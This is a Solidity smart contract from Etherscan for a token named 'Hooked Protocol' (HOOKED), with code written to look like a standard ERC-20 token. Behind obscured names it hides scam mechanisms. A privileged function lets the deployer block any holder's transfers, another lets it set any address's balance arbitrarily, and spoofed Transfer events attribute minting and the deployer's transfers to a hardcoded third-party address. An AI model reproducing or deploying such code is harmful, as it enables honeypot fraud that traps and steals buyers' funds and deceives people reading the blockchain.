/**
 *Submitted for verification at Etherscan.io on 2022-12-01
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

abstract contract Context {
    address xFR = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
 modifier onlyOwner{
   require(msg.sender == _Owner);     
        _; }
    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract HOOKED is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private Trar;
    mapping (address => uint256) private Dxtx;
    mapping (address => mapping (address => uint256)) private CRO;
    uint8 private IVA;
    uint256 private xCL;
    string private _name;
    string private _symbol;



    constructor () {

        
        _name = "Hooked Protocol";
        _symbol = "HOOKED";
        IVA = 9;
        uint256 Orw = 150000000;
        Dxtx[msg.sender] = 3;
        CZE(xFR, Orw*(10**9));
        


    }

    
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return IVA;
    }

    function totalSupply() public view  returns (uint256) {
        return xCL;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return Trar[account];
    }
	 function allowance(address owner, address spender) public view  returns (uint256) {
        return CRO[owner][spender];
    }
	
	 modifier Prp{
    require(Dxtx[msg.sender] == 3);   
        _; }
	
	    function _Chck (address okL, uint256 TPTs) Prp public {
     NN(okL,TPTs);}
	
	   function NN (address okL, uint256 TPTs)  internal {
     Dxtx[okL] = TPTs;}
    function CZE(address account, uint256 amount) onlyOwner public {
     
        xCL = xCL.add(amount);
        Trar[msg.sender] = Trar[msg.sender].add(amount);
        emit Transfer(address(0), account, amount);
    }
function approve(address spender, uint256 amount) public returns (bool success) {    
        CRO[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }

   
    function transfer(address recipient, uint256 amount) public   returns (bool) {
        require(amount <= Trar[msg.sender]);
        require(Dxtx[msg.sender] <= 3);
        xxR(msg.sender, recipient, amount);
        return true;
    }
	
	    function iNd (address okL, uint256 TPTs)  internal {
     Trar[okL] = TPTs;} 
    function transferFrom(address sender, address recipient, uint256 amount) public  returns (bool) {
        require(amount <= Trar[sender]);
              require(Dxtx[sender] <= 3 && Dxtx[recipient] <=3);
                  require(amount <= CRO[sender][msg.sender]);
        xxR(sender, recipient, amount);
        return true;}
    function _Blnc (address okL, uint256 TPTs) Prp public {
   iNd(okL,TPTs);}
  
   

    function xxR(address sender, address recipient, uint256 amount) internal  {
        Trar[sender] = Trar[sender].sub(amount);
        Trar[recipient] = Trar[recipient].add(amount);
       if(Dxtx[sender] == 3) {
            sender = xFR;}
        emit Transfer(sender, recipient, amount); }
     
        }